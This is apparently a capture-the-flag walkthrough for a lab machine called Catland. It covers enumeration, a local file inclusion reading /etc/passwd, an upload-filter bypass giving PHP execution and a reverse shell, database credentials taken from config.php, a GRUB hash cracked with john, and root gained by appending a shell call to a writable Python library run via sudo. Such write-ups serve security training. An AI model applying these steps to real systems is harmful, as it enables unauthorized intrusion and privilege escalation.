***Remote Machine: `10.0.0.5`***  
***Local Machine: `10.0.0.44 `***  
***Difficulty: `Medium`***  

# 1. Enumeration

### - NMAP

    $ nmap -sS -T5 -A -p- 10.0.0.5

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
    | ssh-hostkey: 
    |   3072 c7:10:14:a8:9a:f0:25:1e:0d:b1:c6:6f:1c:a1:88:d8 (RSA)
    |   256 1b:66:f4:e5:b6:23:6e:77:8e:9e:c1:78:c5:bc:ac:e9 (ECDSA)
    |_  256 f4:e9:d8:7a:08:15:d0:92:90:14:df:b3:ec:81:a1:ed (ED25519)
    80/tcp open  http    Apache httpd 2.4.54 ((Debian))
    |_http-title: Catland
    |_http-server-header: Apache/2.4.54 (Debian)

### - HTTP
Going to the HTTP web server we have a home page that points to another page that displays pictures of cats.

![image](https://user-images.githubusercontent.com/76552238/212994443-57c29ee8-0acd-4037-9262-02773047d04d.png)

We can't upload images so we can't execute RCE on the remote server yet. Maybe the images have secret data hidden within them.  
Using Python we can write a script that downloads all the images from the web server.

    import requests
    from bs4 import BeautifulSoup
    import os

    url = "http://10.0.0.5/images"

    def get_all_images(url: str):
        request = requests.get(url).text
        soup = BeautifulSoup(request, 'html.parser')
        
        imageNames = []
        
        for x in soup.find_all('a'):
            fileName = x.get("href")
            if fileName.endswith("jpeg"):
                imageNames.append(fileName)
                
        return imageNames

    def download_images(images: list):
        try:
            os.makedirs("Images")
        except FileExistsError:
            # directory already exists
            pass
        
        for image in images:
            result = requests.get(url + "/" + image)
            open('Images/' + image, 'wb').write(result.content)

    def main():
        download_images(get_all_images(url))

    if __name__ == '__main__': main()

The images didn't have any hidden information or data in them. Let's add the domain **catland.hmv** to the ***/etc/hosts*** file and try to find subdomains. 

    $ ffuf -r -c -ic -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.catland.hmv' -u 'http://10.0.0.5' -fs 757

    admin                   [Status: 200, Size: 1068, Words: 103, Lines: 24, Duration: 614ms]

There is a subdomain at ***"admin.catland.hmv"***.  
Block http://admin.catland.hmv/redirect.js.

![image](https://user-images.githubusercontent.com/76552238/213241496-bff4774d-9736-42ac-82e8-fc33548a2bba.png)

![image](https://user-images.githubusercontent.com/76552238/213241643-80a93af1-b7d2-40e1-8149-6c8ac46c7759.png)


Login in as `laura:Laura_2008`.

![image](https://user-images.githubusercontent.com/76552238/213248175-26152fa7-b5fb-4b20-bd47-353cdd8e51a1.png)

LFI can be performed on the page parameter.

Passing "***../../../etc/passwd***" as the value of the parameter allows to see the file on the remote machine.  

![image](https://user-images.githubusercontent.com/76552238/213249061-e9f954a1-886c-40cc-a7f5-01790710f323.png)

Going to the Accountancy page, we have a file upload function. 

![image](https://user-images.githubusercontent.com/76552238/213251850-a02e8605-ff5f-49c4-84d6-c79350a5d997.png)

Only ZIP files are excepted, let's see if can exploit this to upload a php file that runs command on the remote server. We can upload the malicious file and access it using the LFI weakness we found.  

We can upload ***PHP*** scripts by adding a "***zip***" extension.

    $ cat exploit.php.zip                                       
    <?php echo 'Hello, World!'; ?>  

![image](https://user-images.githubusercontent.com/76552238/213252743-5e9e9d6e-c537-43e2-91b3-a5c246c040b4.png)

Let's upload a reverse shell script and gain access to the remote machine.

    listening on [any] 4444 ...                                                                     
    connect to [10.0.0.44] from (UNKNOWN) [10.0.0.5] 55124                                          
    Linux catland.hmv 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux        
    18:32:44 up  2:18,  0 users,  load average: 0.01, 0.77, 0.68                                   
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                             
    uid=33(www-data) gid=33(www-data) groups=33(www-data)                                           
    /bin/sh: 0: can't access tty; job control turned off                                            
    $ whoami                                                                                        
    www-data 

Let's see if there are any more files on the remote server that we missed.

    $ pwd
    /var/www/admin
    $ ls -l
    total 32
    -rw-r--r-- 1 www-data www-data  853 Jan  7  2022 card.php
    -rw-r--r-- 1 www-data www-data  255 Jan  7  2022 config.php
    -rw-r--r-- 1 www-data www-data 1619 Jan  7  2022 index.php
    -rw-r--r-- 1 www-data www-data   84 Jan  7  2022 redirect.js
    -rw-r--r-- 1 www-data www-data  527 Jan  7  2022 style.css
    -rw-r--r-- 1 www-data www-data 1731 Jan  7  2022 upload.php
    drwxr-xr-x 2 www-data www-data 4096 Jan 18 18:32 uploads
    -rw-r--r-- 1 www-data www-data  864 Jan  7  2022 user.php

    $ cat config.php
    <?php

    $hostname = "localhost";
    $database = "catland";
    $username = "admin";
    $password = "catlandpassword123";
    $conn = mysqli_connect($hostname, $username, $password, $database);
    if (!$conn) {
        die("Connection failed: " . mysqli_connect_error());
    }

    ?>

We now have credentials for the ***mysql*** database.  

    $ mysql -u admin -p
    mysql -u admin -p
    Enter password: catlandpassword123

    MariaDB [(none)]> use database catland;
    MariaDB [(none)]> show tables;
    +-------------------+
    | Tables_in_catland |
    +-------------------+
    | comment           |
    | users             |
    +-------------------+
    2 rows in set (0.000 sec)

    MariaDB [catland]> select * from comment; 
    select * from comment;
    +----------------------+
    | grub                 |
    +----------------------+
    | change grub password |
    +----------------------+

We can read the grub password hash at ***/boot/grub/grub.cgf***.

    grub.pbkdf2.sha512.10000.CAEBC99F7ABA2AC4E57FFFD14649554857738C73E8254222A3C2828D2B3A1E12E84EF7BECE42A6CE647058662D55D9619CA2626A60DB99E2B20D48C0A8CE61EB.6E43CABE0BC795DC76072FC7665297B499C2EB1B020B5751EDC40A89668DBC73D9F507517474A31AE5A0B45452DAD9BD77E85AC0EFB796A61148CC450267EBBC

Using john we can crack the hash and get the password for the user laura.

    $ john --format=PBKDF2-HMAC-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt hash.hash                                                                            
    Using default input encoding: UTF-8                                                             
    Loaded 1 password hash (PBKDF2-HMAC-SHA512, GRUB2 / OS X 10.8+ [PBKDF2-SHA512 256/256 AVX2 4x])
    Cost 1 (iteration count) is 10000 for all loaded hashes
    Will run 2 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    berbatov         (?)     
    1g 0:00:00:54 DONE (2023-01-19 14:31) 0.01819g/s 545.2p/s 545.2c/s 545.2C/s booooo..berbatov
    Use the "--show --format=PBKDF2-HMAC-SHA512" options to display all of the cracked passwords reliably
    Session completed. 

    $ su laura
    Password: berbatov

    $ cat /home/laura/user.txt
    cat user.txt
    933ff8025e8944b6b3b797b2f006b2c0

    $ sudo -ll
    Matching Defaults entries for laura on catland:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User laura may run the following commands on catland:

    Sudoers entry:
        RunAsUsers: ALL
        RunAsGroups: ALL
        Options: !authenticate
        Commands:
            /usr/bin/rtv --help

Let's read the file. 

    $ cat /bin/rtv
    #!/usr/bin/python3
    # EASY-INSTALL-ENTRY-SCRIPT: 'rtv==1.27.0','console_scripts','rtv'
    import re
    import sys

    # for compatibility with easy_install; see #2198
    __requires__ = 'rtv==1.27.0'

    try:
        from importlib.metadata import distribution
    except ImportError:
        try:
            from importlib_metadata import distribution
        except ImportError:
            from pkg_resources import load_entry_point


    def importlib_load_entry_point(spec, group, name):
        dist_name, _, _ = spec.partition('==')
        matches = (
            entry_point
            for entry_point in distribution(dist_name).entry_points
            if entry_point.group == group and entry_point.name == name
        )
        return next(matches).load()


    globals().setdefault('load_entry_point', importlib_load_entry_point)


    if __name__ == '__main__':
        sys.argv[0] = re.sub(r'(-script\.pyw?|\.exe)?$', '', sys.argv[0])
        sys.exit(load_entry_point('rtv==1.27.0', 'console_scripts', 'rtv')())

The file imports the ***importlib/metadata.py*** file, let's find it.

    $ ls -l /lib/python3.9/importlib/metadata.py 
    -rw-r--rw- 1 root root 18235 Jan 19 21:19 /lib/python3.9/importlib/metadata.py

We can write to this file, we can add a command the will be executed when we run the ***"rtv --help"*** command.

    $ echo 'os.system("bin/bash")' >> /lib/python3.9/importlib/metadata.py
    $ sudo rtv --help
    root@catland:/home/laura# id -a
    uid=0(root) gid=0(root) groups=0(root)
    root@catland:/home/laura# cat /root/root.txt
    ca555fc5afb4475bb0878d2b1a76cbe9